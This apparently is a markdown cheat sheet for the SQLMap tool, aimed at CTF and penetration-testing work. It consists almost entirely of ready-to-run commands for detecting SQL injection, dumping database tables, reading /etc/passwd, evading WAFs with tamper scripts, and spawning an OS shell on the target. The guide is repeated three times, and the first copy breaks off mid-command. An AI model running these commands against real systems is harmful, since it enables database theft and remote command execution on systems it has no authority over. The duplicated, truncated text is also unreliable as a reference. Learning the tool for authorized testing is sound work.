---
icon: database
---

# SQLMAP

## The SQLMap Masterclass: Conquer SQL Injection Vulnerabilities

SQLMap automates the detection and exploitation of SQL injection vulnerabilities. This guide shows how to set up your environment variables for dynamic use, then run SQLMap efficiently in your CTF or pentest workflow.

***

### I. Export Environment Variables Setup

Before running SQLMap commands, export all necessary variables in your terminal session to enable dynamic, reusable commands:

```bash
export URL="<https://example.com/vuln>"
export DATA="id=1&submit=Submit"
export DBMS="mysql"
export DB="database_name"
export TABLE="table_name"
export COLS="column1,column2"
export PROXY="<http://127.0.0.1:8080>"
export USER_AGENT="My-Custom-Agent"
export COOKIE="SESSION=abcd1234; other=xyz"
export AUTH_CRED="user:password"
export TECHNIQUE="B"  # B=Boolean, T=Time, U=Union, E=Error
```

This setup allows you to maintain one source of truth per target and reuse your commands rapidly without retyping specifics.

***

### II. Basic Usage with Environment Variables

**Test URL for SQLi:**

```bash
sqlmap -u "$URL"
```

**Specify DBMS:**

```bash
sqlmap -u "$URL" --dbms="$DBMS"
```

**List Databases:**

```bash
sqlmap -u "$URL" --dbs
```

**List Tables:**

```bash
sqlmap -u "$URL" -D "$DB" --tables
```

**List Columns:**

```bash
sqlmap -u "$URL" -D "$DB" -T "$TABLE" --columns
```

**Dump Specified Columns:**

```bash
sqlmap -u "$URL" -D "$DB" -T "$TABLE" -C "$
```

## The SQLMap Masterclass: Conquer SQL Injection Vulnerabilities

SQLMap automates the detection and exploitation of SQL injection vulnerabilities. This guide shows how to set up your environment variables for dynamic use, then run SQLMap efficiently in your CTF or pentest workflow.

***

### I. Export Environment Variables Setup

Before running SQLMap commands, export all necessary variables in your terminal session to enable dynamic, reusable commands:

```bash
export URL="<https://example.com/vulnerable>"
export DATA="id=1&submit=Submit"
export DBMS="mysql"
export DB="database_name"
export TABLE="table_name"
export COLS="column1,column2"
export PROXY="<http://127.0.0.1:8080>"
export USER_AGENT="My-Custom-Agent"
export COOKIE="SESSION=abcd1234; other=xyz"
export AUTH_CRED="user:password"
export TECHNIQUE="B"  # B=Boolean, T=Time, U=Union, E=Error
```

This setup allows you to maintain one source of truth per target and reuse your commands rapidly without retyping specifics.

***

### II. Basic Usage with Environment Variables

**Test URL for SQLi:**

```bash
sqlmap -u "$URL"
```

**Specify DBMS:**

```bash
sqlmap -u "$URL" --dbms="$DBMS"
```

**List Databases:**

```bash
sqlmap -u "$URL" --dbs
```

**List Tables:**

```bash
sqlmap -u "$URL" -D "$DB" --tables
```

**List Columns:**

```bash
sqlmap -u "$URL" -D "$DB" -T "$TABLE" --columns
```

**Dump Specified Columns:**

```bash
sqlmap -u "$URL" -D "$DB" -T "$TABLE" -C "$COLS" --dump
```

***

### III. Advanced Usage

**HTTP POST Method:**

```bash
sqlmap -u "$URL" --method=POST --data="$DATA"
```

**Proxy Usage:**

```bash
sqlmap -u "$URL" --proxy="$PROXY"
```

**Set Custom User-Agent:**

```bash
sqlmap -u "$URL" --user-agent="$USER_AGENT"
```

**Handle Cookies:**

```bash
sqlmap -u "$URL" --cookie="$COOKIE"
```

**Authentication:**

```bash
sqlmap -u "$URL" --auth-type=basic --auth-cred="$AUTH_CRED"
```

**Blind SQL Injection - Time Based:**

```bash
sqlmap -u "$URL" --time-sec=5 --technique="$TECHNIQUE"
```

**Blind SQL Injection - Boolean Based:**

```bash
sqlmap -u "$URL" --technique="$TECHNIQUE"
```

**Union Query Injection:**

```bash
sqlmap -u "$URL" --technique=U
```

**SQL version (stacked or union-capable targets):**

```bash
sqlmap -u "$URL" --sql-query="SELECT @@version"
```

**File Read:**

```bash
sqlmap -u "$URL" --file-read="/etc/passwd"
```

**OS Command Execution:**

```bash
# Spawn interactive OS shell
sqlmap -u "$URL" --os-shell

# Or run a single command
sqlmap -u "$URL" --os-cmd="id"
```

**Using Tamper Scripts:**

```bash
# Examples: adjust to the target/WAF
sqlmap -u "$URL" --tamper="between,randomcase,space2comment"
```

***

### IV. Example Scenarios

*   Boolean-based blind injection:

    ```bash
    sqlmap -u "$URL" --technique=B --dbs
    ```
*   Time-based blind injection:

    ```bash
    sqlmap -u "$URL" --technique=T --dbs
    ```
*   Union-based injection:

    ```bash
    sqlmap -u "$URL" --technique=U --dbs
    ```
*   Error-based injection:

    ```bash
    sqlmap -u "$URL" --technique=E --dbs
    ```
*   Dump user table:

    ```bash
    sqlmap -u "$URL" -D "$DB" -T "$TABLE" -C "$COLS" --dump
    ```

***

### V. Tips for Success

* Always start by exporting your variables.
* Take time on blind injections.
* Explore different tamper scripts.
* Check SQLMap’s help for advanced options.
* Integrate with Burp Suite or manual testing.
* Practice dynamic command execution for speed.

## The SQLMap Masterclass: Conquer SQL Injection Vulnerabilities

SQLMap automates the detection and exploitation of SQL injection vulnerabilities. This guide shows how to set up your environment variables for dynamic use, then run SQLMap efficiently in your CTF or pentest workflow.

***

### I. Export Environment Variables Setup

Before running SQLMap commands, export all necessary variables in your terminal session to enable dynamic, reusable commands:

```bash
export URL="<https://example.com>"
export DATA="id=1&submit=Submit"
export DBMS="mysql"
export DB="database_name"
export TABLE="table_name"
export COLS="column1,column2"
export PROXY="<http://127.0.0.1:8080>"
export USER_AGENT="My-Custom-Agent"
export COOKIE="SESSION=abcd1234; other=xyz"
export AUTH_CRED="user:password"
export TECHNIQUE="B"  # B=Boolean, T=Time, U=Union, E=Error
```

This setup allows you to maintain one source of truth per target and reuse your commands rapidly without retyping specifics.

***

### II. Basic Usage with Environment Variables

**Test URL for SQLi:**

```bash
sqlmap -u "$URL"
```

**Specify DBMS:**

```bash
sqlmap -u "$URL" --dbms="$DBMS"
```

**List Databases:**

```bash
sqlmap -u "$URL" --dbs
```

**List Tables:**

```bash
sqlmap -u "$URL" -D "$DB" --tables
```

**List Columns:**

```bash
sqlmap -u "$URL" -D "$DB" -T "$TABLE" --columns
```

**Dump Specified Columns:**

```bash
sqlmap -u "$URL" -D "$DB" -T "$TABLE" -C "$COLS" --dump
```

***

### III. Advanced Usage

**HTTP POST Method:**

```bash
sqlmap -u "$URL" --method=POST --data="$DATA"
```

**Proxy Usage:**

```bash
sqlmap -u "$URL" --proxy="$PROXY"
```

**Set Custom User-Agent:**

```bash
sqlmap -u "$URL" --user-agent="$USER_AGENT"
```

**Handle Cookies:**

```bash
sqlmap -u "$URL" --cookie="$COOKIE"
```

**Authentication:**

```bash
sqlmap -u "$URL" --auth-type=basic --auth-cred="$AUTH_CRED"
```

**Blind SQL Injection - Time Based:**

```bash
sqlmap -u "$URL" --time-sec=5 --technique="$TECHNIQUE"
```

**Blind SQL Injection - Boolean Based:**

```bash
sqlmap -u "$URL" --technique="$TECHNIQUE"
```

**Union Query Injection:**

```bash
sqlmap -u "$URL" --technique=U
```

**SQL version (stacked or union-capable targets):**

```bash
sqlmap -u "$URL" --sql-query="SELECT @@version"
```

**File Read:**

```bash
sqlmap -u "$URL" --file-read="/etc/passwd"
```

**OS Command Execution:**

```bash
# Spawn interactive OS shell
sqlmap -u "$URL" --os-shell

# Or run a single command
sqlmap -u "$URL" --os-cmd="id"
```

**Using Tamper Scripts:**

```bash
# Examples: adjust to the target/WAF
sqlmap -u "$URL" --tamper="between,randomcase,space2comment"
```

***

### IV. Example Scenarios

*   Boolean-based blind injection:

    ```bash
    sqlmap -u "$URL" --technique=B --dbs
    ```
*   Time-based blind injection:

    ```bash
    sqlmap -u "$URL" --technique=T --dbs
    ```
*   Union-based injection:

    ```bash
    sqlmap -u "$URL" --technique=U --dbs
    ```
*   Error-based injection:

    ```bash
    sqlmap -u "$URL" --technique=E --dbs
    ```
*   Dump user table:

    ```bash
    sqlmap -u "$URL" -D "$DB" -T "$TABLE" -C "$COLS" --dump
    ```

***

### V. Tips for Success

* Always start by exporting your variables.
* Take time on blind injections.
* Explore different tamper scripts.
* Check SQLMap’s help for advanced options.
* Integrate with Burp Suite or manual testing.
* Practice dynamic command execution for speed.
